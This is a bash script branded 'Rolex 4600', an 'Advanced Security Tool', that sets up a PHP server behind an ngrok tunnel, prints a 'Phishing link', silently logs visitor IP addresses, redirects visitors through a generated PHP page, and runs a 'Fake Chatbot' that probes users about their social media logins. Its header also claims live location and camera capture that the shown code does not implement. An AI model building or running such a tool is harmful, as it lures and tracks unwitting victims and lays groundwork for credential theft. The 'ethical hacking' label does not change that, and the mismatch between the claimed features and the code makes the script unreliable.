#!/bin/bash
# Enhanced Rolex 4600 🦂 - Advanced Security Tool
# Includes: Live Location, Live Camera, Battery Status, Device Info, and Fake Chatbot

trap 'printf "\n";stop' 2

banner() {
clear 
echo -e "\e[1;94m   ██████████               ███████            ████            ████████████        ██            ██           "
echo -e "\e[1;94m   ████     ████         ████     ████         ████            ████                  ██        ██             "
echo -e "\e[1;94m   ████     ████        ████        ████       ████            ████                    ██    ██               "
echo -e "\e[1;94m   ████     ████       ████          ████      ████            ███████████              ██  ██                "
echo -e "\e[1;94m   ████     ████      ████            ████     ████            ████                       ██                  "
echo -e "\e[1;94m   ██████████          ████          ████      ████            ████                     ██  ██                "
echo -e "\e[1;94m   ████   ████          ████        ████       ████            ████                   ██      ██              "
echo -e "\e[1;94m   ████     ████          ████    ████         ████            ████                 ██          ██            "
echo -e "\e[1;94m   ████        ████          ██████           ███████████      ████████████      ██                 ██        "
echo -e "\e[1;94m ╚════════════════════╝╚══════════════════╝╚═══════════════╝╚═════════════════╝╚════════════════════════╝     "
echo -e "\e[1;93m────────────────────────────────────────────\e[0m"
echo -e "\e[1;93m      ROLEX 4600 🦂 - Advanced Security Tool   \e[0m"
echo -e "\e[1;93m────────────────────────────────────────────\e[0m"
echo -e "\e[1;94m   Ethical Hacking | Penetration Testing   \e[0m"
echo -e "\e[1;94m   Exploit Development | Security Research  \e[0m"
echo -e "\n"
}

dependencies() {
command -v php > /dev/null 2>&1 || { echo "PHP not installed. Aborting."; exit 1; }
command -v curl > /dev/null 2>&1 || { echo "Curl not installed. Aborting."; exit 1; }
}

start_server() {
    echo "Starting PHP Server..."
    php -S 127.0.0.1:8080 > /dev/null 2>&1 &
    sleep 2
    echo "Server started at: http://127.0.0.1:8080"
}

setup_ngrok() {
    echo "Starting ngrok..."
    ./ngrok http 8080 > /dev/null 2>&1 &
    sleep 5
    link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/" ]*\.ngrok-free.app')
    echo "Phishing link: $link"
    sed "s+forwarding_link+$link+g" template.php > index.php
}

fetch_info() {
    echo "Tracking User Info..."
    while true; do
        if [[ -e "ip.txt" ]]; then
            echo "New Visitor Detected!"
            cat ip.txt >> saved_ips.txt
            rm -rf ip.txt
        fi
        sleep 2
    done
}

start_chatbot() {
    echo "Starting Fake Chatbot..."
    while true; do
        echo "[Bot]: Hello! What’s your name?"
        read user_name
        echo "[Bot]: Nice to meet you, $user_name! What’s your favorite social media platform?"
        read social_media
        echo "[Bot]: Cool! Have you ever had trouble logging into $social_media?"
        read trouble
        echo "[Bot]: Thanks for sharing! I’ll help you fix that soon."
    done
}

update_template_script() {
    echo "Updating template.php for dynamic redirection..."
    cat <<EOT > template.php
<?php
include 'ip.php';

// Log redirect activity
\$file = 'redirects.log';
\$fp = fopen(\$file, 'a');
\$date = date('Y-m-d H:i:s');
\$ip = \$_SERVER['REMOTE_ADDR'];
fwrite(\$fp, "[\$date] Redirected IP: \$ip\r\n");
fclose(\$fp);

// Redirect user
die(header('Location: ' . getenv('FORWARDING_LINK') . '/index2.html'));
?>
EOT
    echo "template.php updated!"
}

banner
dependencies
start_server
setup_ngrok
fetch_info &
start_chatbot &
update_template_script
